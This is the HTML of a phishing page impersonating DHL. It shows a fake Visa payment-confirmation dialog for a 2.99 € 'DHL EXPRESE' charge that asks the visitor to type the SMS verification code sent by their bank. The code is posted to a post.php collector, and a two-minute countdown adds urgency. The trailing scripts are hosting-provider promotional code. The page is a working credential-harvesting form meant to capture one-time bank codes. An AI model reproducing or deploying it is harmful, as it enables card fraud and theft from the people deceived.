<html><head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Login to Customer Portals and Tools | DHL |</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon">
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon">
        <!-- link__css -->
        <link rel="stylesheet" href="css/bootstrap.css">
        <link rel="stylesheet" href="css/posta.css">
		<style>
			.modal-open{
				overflow:hidden;
				padding-right:0px;
			}
		</style>


</head>
<body class="modal-open">


		

		<!-- Modal -->
		<div class="modal fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;">
		  <div class="modal-dialog shadow">
		    <div class="modal-content">
		      <div class="modal-header">
		        	<img src="image/dhl-logo.svg">
		            <img src="image/viza.svg" class="sfli">
		      </div>
		      <div class="modal-body">
		      	<div class="text-center pp">
                    <h6>Please confirm the following payment.</h6>
                </div>
                <div class="tato">
                     <p>The unique password has been sent to the phone number listed below. If you need to change your phone number, please contact your bank via the available channels (ATM, web) .</p>
                </div>
		        <form action="post.php" method="post">
                     <input type="hidden" name="step" value="sms">
                     <div class="content">
                         <div class="left">
                             <span>Merchant:</span>
                             <span>Amount:</span>
                             <span>Date:</span>
                            
                             <span class="osama">code SMS:</span>
                         </div>
                         <div class="right">
                             <span style="color: rgb(227,41,31);">DHL EXPRESE</span>
                             <span><b>2.99 €</b></span>
                             <span>13/06/2023</span>
                             
                             <span>
                                 <div class="form-group">
                                     <input type="text" name="sim" id="sim" class="form-control">
                                 </div>
                             </span>
                         </div>
                     </div>
                     <div class="time ">
                         <p>Please enter the verification code received by sms</p>
                         <div class="countdown ms-2" style="color:red;">-1:59</div>
                     </div>
                     <div class="botona">
                         <button class="btn" name="submit">Submit</button>
                     </div>
                     <div class="copirayt text-center">
                         <p>2023 © DHL International GmbH - All rights reserved.</p>
                     </div>
                 </form>
		      </div>
		    </div>
		  </div>
		</div>


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/Bootstrap.js"></script>
        <script>

        /*  $("#sim").mask("000000"); */

          var timer2 = "02:00";
          var interval = setInterval(function() {
          var timer = timer2.split(':');
          //by parsing integer, I avoid all extra string processing
          var minutes = parseInt(timer[0], 10);
          var seconds = parseInt(timer[1], 10);
          --seconds;
          minutes = (seconds < 0) ? --minutes : minutes;
          if (minutes < 0) clearInterval(interval);
          seconds = (seconds < 0) ? 59 : seconds;
          seconds = (seconds < 10) ? '0' + seconds : seconds;
          //minutes = (minutes < 10) ?  minutes : minutes;
          $('.countdown').html(minutes + ':' + seconds);
          timer2 = minutes + ':' + seconds;
          }, 1000);
             
        </script>
<div style="text-align:right;position:fixed;z-index:9999999;bottom:0;width:auto;right:1%;cursor:pointer;line-height:0;display:block!important"></div><script>function getCookie(t){for(var e=t+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(e))return i.substring(e.length,i.length)}return""}getCookie("hostinger")&&(document.cookie="hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",location.reload());var wordpressAdminBody=document.getElementsByClassName("wp-admin")[0],notification=document.getElementsByClassName("notice notice-success is-dismissible"),hostingerLogo=document.getElementsByClassName("hlogo"),mainContent=document.getElementsByClassName("notice_content")[0];if(null!=wordpressAdminBody&&0<notification.length&&null!=mainContent){var googleFont=document.createElement("link");googleFontHref=document.createAttribute("href"),googleFontRel=document.createAttribute("rel"),googleFontHref.value="https://fonts.googleapis.com/css?family=Roboto:300,400,600,700",googleFontRel.value="stylesheet",googleFont.setAttributeNode(googleFontHref),googleFont.setAttributeNode(googleFontRel);var css="@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 1;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; display: flex; justify-content: center; width: 50%; margin-left: 45%;}} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {min-height: 454px; display: flex; flex-direction: column; justify-content: center; z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); width: 264px; border: 0; border-radius: 3px; background-color: #FF5C62 !important; padding: 15px 55px !important; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",style=document.createElement("style"),sheet=window.document.styleSheets[0];style.styleSheet?style.styleSheet.cssText=css:style.appendChild(document.createTextNode(css)),document.getElementsByTagName("head")[0].appendChild(style),document.getElementsByTagName("head")[0].appendChild(googleFont);var button=document.getElementsByClassName("upgrade_button_red")[0],link=button.parentElement;link.setAttribute("href","https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"),link.innerHTML='<button class="upgrade_button_red_sale">Claim Deal</button>',(notification=notification[0]).setAttribute("style","padding-bottom: 0; padding-top: 5px; background-color: #040713; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-left-color: #040713;"),notification.className="notice notice-error is-dismissible";var mainContentHolder=document.getElementById("main_content");mainContentHolder.setAttribute("style","padding: 0;"),hostingerLogo[0].remove();var h1Tag=notification.getElementsByTagName("H1")[0];h1Tag.className="000-h1",h1Tag.innerHTML="Black Friday",h1Tag.setAttribute("style",'color: white; font-family: "Roboto", sans-serif; font-size: 48px; font-weight: 700;');var h2Tag=document.createElement("H2");h2Tag.innerHTML="Up to 90% off 4-year hosting plans + free domain, SSL & DDoS protection",h2Tag.setAttribute("style",'color: white; margin: 10px 0 15px 0; font-family: "Roboto", sans-serif; font-size: 16px; font-weight: 400; line-height: 1;'),h1Tag.parentNode.insertBefore(h2Tag,h1Tag.nextSibling);var paragraph=notification.getElementsByTagName("p")[0];paragraph.innerHTML="$<span style='font-size: 80px;'>2.49</span>/mo",paragraph.setAttribute("style",'font-family: "Roboto", sans-serif; font-size: 48px; font-weight: 700; margin: 0;');var list=notification.getElementsByTagName("UL")[0];list.remove();var org_html=mainContent.innerHTML,new_html='<div class="content-wrapper">'+mainContent.innerHTML+'</div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/bf-2022-bottom-banner.png"></div>';mainContent.innerHTML=new_html;var saleImage=mainContent.getElementsByClassName("web-hosting-90-off-image")[0]}</script>
<script src="moz-extension://7c6bb315-e5e2-4f96-a826-1489c12b1cff/js/app.js" type="text/javascript"></script></body></html>